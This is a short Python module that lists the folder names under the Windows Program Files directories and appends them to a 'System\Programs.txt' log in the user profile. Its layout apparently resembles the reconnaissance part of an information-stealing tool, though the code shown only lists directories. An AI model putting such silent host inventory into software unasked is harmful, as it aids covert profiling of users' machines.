from os import environ,listdir
from manager.logger import Log
from preferences.config import config

def Programs():
    path = r"C:\Program Files (x86)"
    path1 = r"C:\Program Files"
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\System\\Programs.txt'
    try:
        dirs = listdir(path)
        with open(pathToLogs, "a", encoding="utf-8") as prog:
            prog.write(path+"\n")
            for programs in dirs:
                prog.write(programs+"\n")
        prog.close()

        dirs = listdir(path1)
        with open(pathToLogs, "a", encoding="utf-8") as prog:
            prog.write(path1+"\n")
            for programs in dirs:
                prog.write(programs+"\n")
        prog.close()
    except Exception as e:
        Log(f"Programs ---> {e}")